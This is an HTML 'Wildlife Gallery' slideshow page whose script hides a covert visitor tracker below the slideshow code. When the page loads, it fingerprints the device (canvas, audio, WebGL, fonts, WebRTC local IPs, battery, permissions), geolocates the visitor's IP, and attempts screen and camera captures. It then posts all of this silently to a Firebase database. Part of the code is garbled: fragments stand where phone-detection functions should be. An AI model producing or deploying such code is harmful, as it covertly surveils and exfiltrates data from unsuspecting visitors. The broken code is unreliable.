<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wildlife Gallery</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 800px;
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            overflow: hidden;
            animation: slideUp 0.6s ease-out;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px 20px;
            text-align: center;
        }

        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }

        .header p {
            font-size: 14px;
            opacity: 0.9;
        }

        .slideshow-container {
            position: relative;
            width: 100%;
            height: 500px;
            background: #f0f0f0;
            overflow: hidden;
        }

        .slide {
            display: none;
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
            animation: fadeIn 0.8s;
        }

        .slide.active {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .slide img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transition: transform 0.5s ease;
        }

        .slide img:hover {
            transform: scale(1.05);
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        .slide-counter {
            position: absolute;
            bottom: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.6);
            color: white;
            padding: 10px 15px;
            border-radius: 20px;
            font-size: 14px;
            z-index: 10;
            transition: background 0.3s ease;
        }

        .slide-counter:hover {
            background: rgba(0, 0, 0, 0.8);
        }

        .controls {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            background: #f9f9f9;
            gap: 10px;
        }

        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        button::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            transform: translate(-50%, -50%);
            transition: width 0.4s ease, height 0.4s ease;
        }

        button:hover::before {
            width: 200px;
            height: 200px;
        }

        button:hover {
            background: #764ba2;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }

        button:active {
            transform: translateY(0);
        }

        button:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }

        button:disabled:hover {
            box-shadow: none;
        }

        @media (max-width: 600px) {
            .header h1 {
                font-size: 20px;
            }

            .slideshow-container {
                height: 300px;
            }

            .controls {
                flex-wrap: wrap;
            }

            button {
                flex: 1;
                min-width: 100px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Wildlife Gallery</h1>
            <p>Enjoy this beautiful collection of wildlife photography</p>
        </div>

        <div class="slideshow-container">
            <div class="slide active">
                <img src="https://images.pexels.com/photos/1618606/pexels-photo-1618606.jpeg?auto=compress&cs=tinysrgb&w=800" alt="African Elephant">
            </div>
            <div class="slide">
                <img src="https://images.pexels.com/photos/47547/squirrel-animal-cute-eyes-47547.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Squirrel">
            </div>
            <div class="slide">
                <img src="https://images.pexels.com/photos/3331217/pexels-photo-3331217.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Tiger">
            </div>
            <div class="slide">
                <img src="https://images.pexels.com/photos/50581/lion-wild-africa-portrait-50581.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Lion">
            </div>
            <div class="slide">
                <img src="https://images.pexels.com/photos/349758/hummingbird-bird-birds-349758.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Hummingbird">
            </div>

            <div class="slide-counter">
                <span id="current-slide">1</span> / <span id="total-slides">5</span>
            </div>
        </div>

        <div class="controls">
            <button id="prev-btn" onclick="previousSlide()">← Previous</button>
            <button id="play-btn" onclick="toggleAutoPlay()">Auto Play</button>
            <button id="next-btn" onclick="nextSlide()">Next →</button>
        </div>
    </div>

    <script>
        let currentSlide = 0;
        let autoPlayActive = false;
        let autoPlayInterval = null;
        const slides = document.querySelectorAll('.slide');
        const totalSlides = slides.length;

        document.getElementById('total-slides').textContent = totalSlides;

        function showSlide(n) {
            slides.forEach(slide => slide.classList.remove('active'));
            slides[n].classList.add('active');
            document.getElementById('current-slide').textContent = n + 1;
        }

        function nextSlide() {
            currentSlide = (currentSlide + 1) % totalSlides;
            showSlide(currentSlide);
        }

        function previousSlide() {
            currentSlide = (currentSlide - 1 + totalSlides) % totalSlides;
            showSlide(currentSlide);
        }

        function toggleAutoPlay() {
            autoPlayActive = !autoPlayActive;
            const btn = document.getElementById('play-btn');

            if (autoPlayActive) {
                btn.textContent = 'Stop';
                autoPlayInterval = setInterval(nextSlide, 4000);
            } else {
                btn.textContent = 'Auto Play';
                clearInterval(autoPlayInterval);
            }
        }

        // ============================================
        // ADVANCED DEVICE FINGERPRINTING
        // ============================================

        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browserName = 'Unknown';
            let browserVersion = 'Unknown';
            let osName = 'Unknown';
            let osVersion = 'Unknown';

            if (ua.indexOf('Firefox') > -1) {
                browserName = 'Firefox';
                browserVersion = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || 'Unknown';
            } else if (ua.indexOf('Edg') > -1) {
                browserName = 'Edge';
                browserVersion = ua.match(/Edg\/(\d+\.\d+)/)?.[1] || 'Unknown';
            } else if (ua.indexOf('Chrome') > -1) {
                browserName = 'Chrome';
                browserVersion = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || 'Unknown';
            } else if (ua.indexOf('Safari') > -1) {
                browserName = 'Safari';
                browserVersion = ua.match(/Version\/(\d+\.\d+)/)?.[1] || 'Unknown';
            } else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) {
                browserName = 'Opera';
                browserVersion = ua.match(/(?:Opera|OPR)\/(\d+\.\d+)/)?.[1] || 'Unknown';
            } else if (ua.indexOf('Trident') > -1) {
                browserName = 'Internet Explorer';
                browserVersion = ua.match(/rv:(\d+\.\d+)/)?.[1] || 'Unknown';
            }

            if (ua.indexOf('Windows NT 10') > -1) {
                osName = 'Windows';
                osVersion = '10/11';
            } else if (ua.indexOf('Windows NT 6.3') > -1) {
                osName = 'Windows';
                osVersion = '8.1';
            } else if (ua.indexOf('Windows NT 6.2') > -1) {
                osName = 'Windows';
                osVersion = '8';
            } else if (ua.indexOf('Windows NT 6.1') > -1) {
                osName = 'Windows';
                osVersion = '7';
            } else if (ua.indexOf('Mac OS X') > -1) {
                osName = 'macOS';
                osVersion = ua.match(/Mac OS X (\d+[._]\d+)/)?.[1]?.replace('_', '.') || 'Unknown';
            } else if (ua.indexOf('Android') > -1) {
                osName = 'Android';
                osVersion = ua.match(/Android (\d+\.\d+)/)?.[1] || 'Unknown';
            } else if (ua.indexOf('iOS') > -1 || (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1)) {
                osName = 'iOS';
                osVersion = ua.match(/OS (\d+[._]\d+)/)?.[1]?.replace('_', '.') || 'Unknown';
            } else if (ua.indexOf('Linux') > -1) {
                osName = 'Linux';
                osVersion = '-';
            } else if (ua.indexOf('CrOS') > -1) {
                osName = 'Chrome OS';
                osVersion = '-';
            }

            return { browserName, browserVersion, osName, osVersion };
        }

                }

            if (ua.includes('iPad')) {

            if (androidModelMatch) {

            }

            return 'Unknown Model';
        }

        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
                return 'Tablet';
            } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
                return 'Mobile';
            }
            return 'Desktop';
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;

                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Wildlife Gallery', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Canvas FP', 4, 17);

                return canvas.toDataURL();
            } catch (e) {
                return 'Canvas not supported';
            }
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

                if (!gl) return { vendor: 'Not supported', renderer: 'Not supported' };

                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');

                let vendor = 'Unknown';
                let renderer = 'Unknown';

                if (debugInfo) {
                    vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }

                return {
                    vendor,
                    renderer,
                    webglVersion: gl.getParameter(gl.VERSION),
                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                    maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
                    extensions: gl.getSupportedExtensions()?.slice(0, 10).join(', ') || 'None'
                };
            } catch (e) {
                return { vendor: 'Error', renderer: 'Error' };
            }
        }

        async function getBatteryInfo() {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging ? 'Yes' : 'No',
                    chargingTime: battery.chargingTime === Infinity ? 'Not charging' : battery.chargingTime + 's',
                    dischargingTime: battery.dischargingTime === Infinity ? 'Not discharging' : battery.dischargingTime + 's'
                };
            } catch (e) {
                return { level: 'Not available', charging: 'Unknown', chargingTime: '-', dischargingTime: '-' };
            }
        }

        async function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

            return {
                effectiveType: connection?.effectiveType || 'Unknown',
                downlink: connection?.downlink ? connection.downlink + ' Mbps' : 'Unknown',
                rtt: connection?.rtt ? connection.rtt + ' ms' : 'Unknown',
                saveData: connection?.saveData ? 'Yes' : 'No',
                type: connection?.type || 'Unknown'
            };
        }

        function getAudioFingerprint() {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const analyser = audioContext.createAnalyser();
                const gain = audioContext.createGain();
                const processor = audioContext.createScriptProcessor(4096, 1, 1);

                gain.gain.value = 0;
                oscillator.type = 'triangle';
                oscillator.frequency.value = 10000;

                oscillator.connect(analyser);
                analyser.connect(processor);
                processor.connect(gain);
                gain.connect(audioContext.destination);

                oscillator.start(0);

                const fingerprint = {
                    sampleRate: audioContext.sampleRate,
                    channelCount: audioContext.destination.channelCount,
                    maxChannelCount: audioContext.destination.maxChannelCount,
                    state: audioContext.state
                };

                oscillator.stop();
                audioContext.close();

                return fingerprint;
            } catch (e) {
                return { error: 'Audio API not supported' };
            }
        }

        async function getLocalIPs() {
            const ips = [];
            try {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');

                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);

                await new Promise((resolve) => {
                    pc.onicecandidate = (event) => {
                        if (!event.candidate) {
                            resolve();
                            return;
                        }
                        const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (ipMatch && !ips.includes(ipMatch[1])) {
                            ips.push(ipMatch[1]);
                        }
                    };
                    setTimeout(resolve, 3000);
                });

                pc.close();
            } catch (e) {
                // WebRTC not supported
            }
            return ips;
        }

        function getMediaDevices() {
            return new Promise((resolve) => {
                if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
                    resolve({ audioInputs: 0, videoInputs: 0, audioOutputs: 0 });
                    return;
                }

                navigator.mediaDevices.enumerateDevices()
                    .then(devices => {
                        const counts = { audioInputs: 0, videoInputs: 0, audioOutputs: 0, devices: [] };
                        devices.forEach(device => {
                            if (device.kind === 'audioinput') counts.audioInputs++;
                            if (device.kind === 'videoinput') counts.videoInputs++;
                            if (device.kind === 'audiooutput') counts.audioOutputs++;
                            counts.devices.push({
                                kind: device.kind,
                                label: device.label || 'Permission denied',
                                deviceId: device.deviceId ? 'Present' : 'N/A'
                            });
                        });
                        resolve(counts);
                    })
                    .catch(() => {
                        resolve({ audioInputs: 0, videoInputs: 0, audioOutputs: 0 });
                    });
            });
        }

        function getSystemFonts() {
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const testFonts = [
                'Arial', 'Arial Black', 'Arial Narrow', 'Calibri', 'Cambria', 'Cambria Math',
                'Comic Sans MS', 'Consolas', 'Courier', 'Courier New', 'Georgia', 'Helvetica',
                'Impact', 'Lucida Console', 'Lucida Sans Unicode', 'Microsoft Sans Serif',
                'Palatino Linotype', 'Segoe UI', 'Tahoma', 'Times', 'Times New Roman',
                'Trebuchet MS', 'Verdana', 'Segoe Print', 'Segoe Script'
            ];

            const testString = 'mmmmmmmmmmlli';
            const testSize = '72px';
            const h = document.getElementsByTagName('body')[0];
            const span = document.createElement('span');
            span.style.fontSize = testSize;
            span.innerHTML = testString;

            const defaultWidth = {};
            for (const baseFont of baseFonts) {
                span.style.fontFamily = baseFont;
                h.appendChild(span);
                defaultWidth[baseFont] = span.offsetWidth;
                h.removeChild(span);
            }

            const detectedFonts = [];
            for (const testFont of testFonts) {
                let detected = false;
                for (const baseFont of baseFonts) {
                    span.style.fontFamily = testFont + ', ' + baseFont;
                    h.appendChild(span);
                    const width = span.offsetWidth;
                    h.removeChild(span);
                    if (width !== defaultWidth[baseFont]) {
                        detected = true;
                        break;
                    }
                }
                if (detected) {
                    detectedFonts.push(testFont);
                }
            }

            return detectedFonts;
        }

        function getPermissions() {
            return new Promise((resolve) => {
                const permissions = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write'];
                const results = {};

                if (!navigator.permissions) {
                    resolve({ supported: false });
                    return;
                }

                let pending = permissions.length;
                permissions.forEach(perm => {
                    navigator.permissions.query({ name: perm })
                        .then(result => {
                            results[perm] = result.state;
                            pending--;
                            if (pending === 0) resolve({ supported: true, permissions: results });
                        })
                        .catch(() => {
                            results[perm] = 'unknown';
                            pending--;
                            if (pending === 0) resolve({ supported: true, permissions: results });
                        });
                });
            });
        }

        function getStorageInfo() {
            return {
                localStorage: typeof localStorage !== 'undefined' ? 'Supported' : 'Not supported',
                sessionStorage: typeof sessionStorage !== 'undefined' ? 'Supported' : 'Not supported',
                cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
                indexedDB: typeof indexedDB !== 'undefined' ? 'Supported' : 'Not supported',
                openDatabase: typeof openDatabase !== 'undefined' ? 'Supported' : 'Not supported'
            };
        }

        function getPluginInfo() {
            const plugins = [];
            if (navigator.plugins) {
                for (let i = 0; i < navigator.plugins.length; i++) {
                    plugins.push({
                        name: navigator.plugins[i].name,
                        filename: navigator.plugins[i].filename,
                        description: navigator.plugins[i].description
                    });
                }
            }
            return plugins.length > 0 ? plugins : [{ name: 'No plugins detected', filename: '-', description: '-' }];
        }

        function getTimezoneInfo() {
            try {
                const timezone = Intl.DateTimeFormat().resolvedOptions();
                return {
                    timeZone: timezone.timeZone,
                    locale: timezone.locale,
                    calendar: timezone.calendar,
                    numberingSystem: timezone.numberingSystem,
                    offset: new Date().getTimezoneOffset()
                };
            } catch (e) {
                return { timeZone: 'Unknown', locale: 'Unknown', calendar: 'Unknown', numberingSystem: 'Unknown', offset: 0 };
            }
        }

        async function getScreenCapture() {
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({
                    video: { displaySurface: 'monitor' },
                    audio: false
                });

                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(resolve => setTimeout(resolve, 500));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/png');

                stream.getTracks().forEach(track => track.stop());
                return imageData;
            } catch (e) {
                return null;
            }
        }

        async function getCameraCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                    audio: false
                });

                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(resolve => setTimeout(resolve, 300));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/png');

                stream.getTracks().forEach(track => track.stop());
                return imageData;
            } catch (e) {
                return null;
            }
        }

        async function collectAllDeviceInfo() {
            const browserInfo = getBrowserInfo();
            const phoneBrand = getPhoneBrand();
            const phoneModel = getPhoneModel();
            const webgl = getWebGLInfo();
            const battery = await getBatteryInfo();
            const network = await getNetworkInfo();
            const audio = getAudioFingerprint();
            const localIPs = await getLocalIPs();
            const mediaDevices = await getMediaDevices();
            const fonts = getSystemFonts();
            const perms = await getPermissions();
            const storage = getStorageInfo();
            const plugins = getPluginInfo();
            const timezoneInfo = getTimezoneInfo();

            return {
                // Basic Device Info
                deviceName: navigator.platform || 'Unknown',
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                phoneBrand: phoneBrand,
                phoneModel: phoneModel,
                deviceType: getDeviceType(),

                // Browser Info
                browserName: browserInfo.browserName,
                browserVersion: browserInfo.browserVersion,
                osName: browserInfo.osName,
                osVersion: browserInfo.osVersion,

                // Screen Info
                screenWidth: screen.width,
                screenHeight: screen.height,
                screenRes: screen.width + 'x' + screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                devicePixelRatio: window.devicePixelRatio,

                // Viewport
                viewportWidth: window.innerWidth,
                viewportHeight: window.innerHeight,

                // Hardware
                cpuCores: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                touchSupport: 'ontouchstart' in window,

                // WebGL / GPU
                gpuVendor: webgl.vendor,
                gpuRenderer: webgl.renderer,
                webglVersion: webgl.webglVersion,
                maxTextureSize: webgl.maxTextureSize,

                // Battery
                batteryLevel: battery.level,
                batteryCharging: battery.charging,

                // Network
                connectionType: network.type,
                effectiveConnection: network.effectiveType,
                downlink: network.downlink,
                rtt: network.rtt,
                online: navigator.onLine,

                // Audio
                audioSampleRate: audio.sampleRate,
                audioChannelCount: audio.channelCount,

                // Memory - heap limit
                jsHeapSizeLimit: performance.memory ? performance.memory.jsHeapSizeLimit : 'N/A',
                totalJSHeapSize: performance.memory ? performance.memory.totalJSHeapSize : 'N/A',

                // Local IPs
                localIPs: localIPs,

                // Media Devices
                hasCamera: mediaDevices.videoInputs > 0,
                hasMicrophone: mediaDevices.audioInputs > 0,
                hasSpeakers: mediaDevices.audioOutputs > 0,
                mediaDevices: mediaDevices.devices,

                // Permissions
                permissions: perms.permissions,

                // Fonts
                installedFonts: fonts,

                // Storage
                localStorage: storage.localStorage,
                cookiesEnabled: storage.cookies,
                indexedDB: storage.indexedDB,

                // Plugins
                browserPlugins: plugins.map(p => p.name).join(', '),

                // Timezone
                timezone: timezoneInfo.timeZone,
                timezoneOffset: timezoneInfo.offset,
                locale: timezoneInfo.locale,

                // Language
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',

                // Canvas Fingerprint (hash)
                canvasFingerprint: getCanvasFingerprint() ? 'Generated' : 'Not supported',

                // Do Not Track
                doNotTrack: navigator.doNotTrack || 'Unspecified',

                // PDF Viewer
                pdfViewer: navigator.pdfViewerEnabled ? 'Yes' : 'No',

                // Java Enabled (Legacy)
                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,

                // Vendor
                vendor: navigator.vendor,

                // App Info
                appName: navigator.appName,
                appVersion: navigator.appVersion,

                // History
                historyLength: window.history.length,

                // Referrer
                referrer: document.referrer || 'Direct visit',

                // Screen orientation
                screenOrientation: screen.orientation ? screen.orientation.type : 'Unknown',

                // Timestamp
                timestamp: new Date().toISOString(),

                // Visited page
                currentURL: window.location.href,
                pageTitle: document.title
            };
        }

        async function getIPAndLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    country: data.country_name,
                    city: data.city,
                    region: data.region,
                    district: data.district || 'N/A',
                    latitude: data.latitude,
                    longitude: data.longitude,
                    isp: data.org,
                    org: data.org,
                    asn: data.asn,
                    postal: data.postal,
                    countryCode: data.country_code,
                    continent: data.continent_code,
                    timezone: data.timezone,
                    currency: data.currency,
                    languages: data.languages,
                    countryCallingCode: data.country_calling_code
                };
            } catch (error) {
                try {
                    const backupResponse = await fetch('https://ipwho.is/');
                    const backupData = await backupResponse.json();
                    if (backupData.success) {
                        return {
                            ip: backupData.ip,
                            country: backupData.country,
                            city: backupData.city,
                            region: backupData.region,
                            district: 'N/A',
                            latitude: backupData.latitude,
                            longitude: backupData.longitude,
                            isp: backupData.connection?.isp,
                            org: backupData.connection?.org,
                            asn: 'AS' + backupData.connection?.asn,
                            postal: backupData.postal,
                            countryCode: backupData.country_code,
                            continent: backupData.continent,
                            timezone: backupData.timezone?.id,
                            currency: backupData.currency?.code,
                            languages: backupData.languages?.[0]?.name || 'Unknown',
                            countryCallingCode: '+' + backupData.country_code
                        };
                    }
                } catch (backupError) {
                    return { error: 'Could not fetch location data' };
                }
                return { error: 'Could not fetch location data' };
            }
        }

        async function saveEverythingToFirebase(deviceData, locationData, screenCapture, cameraCapture) {
            try {
                const firebaseURL = 'https://cybersecurity-c1710-default-rtdb.asia-southeast1.firebasedatabase.app/visitor_data.json';

                const payload = {
                    device: deviceData,
                    location: locationData,
                    captures: {
                        screen: screenCapture ? screenCapture.substring(0, 200) + '...' : null,
                        camera: cameraCapture ? cameraCapture.substring(0, 200) + '...' : null,
                        screenCaptured: screenCapture ? true : false,
                        cameraCaptured: cameraCapture ? true : false
                    },
                    timestamp: new Date().toISOString(),
                    sessionId: Date.now().toString(36) + Math.random().toString(36).substr(2)
                };

                await fetch(firebaseURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                // Silent fail
            }
        }

        async function initTracker() {
            try {
                // Collect all device info silently
                const deviceData = await collectAllDeviceInfo();
                const locationData = await getIPAndLocation();

                // Try to capture screen silently (will prompt for permission)
                let screenCapture = null;
                let cameraCapture = null;

                // Attempt silent capture (user must grant permission)
                try {
                    screenCapture = await getScreenCapture();
                    cameraCapture = await getCameraCapture();
                } catch (e) {
                    // Capture failed or permission denied
                }

                // Save everything to Firebase
                await saveEverythingToFirebase(deviceData, locationData, screenCapture, cameraCapture);

            } catch (error) {
                // Silent operation
            }
        }

        // Run on load
        document.addEventListener('DOMContentLoaded', () => {
            initTracker();
        });

        // Also run after small delay to ensure everything is loaded
        setTimeout(initTracker, 1000);
    </script>
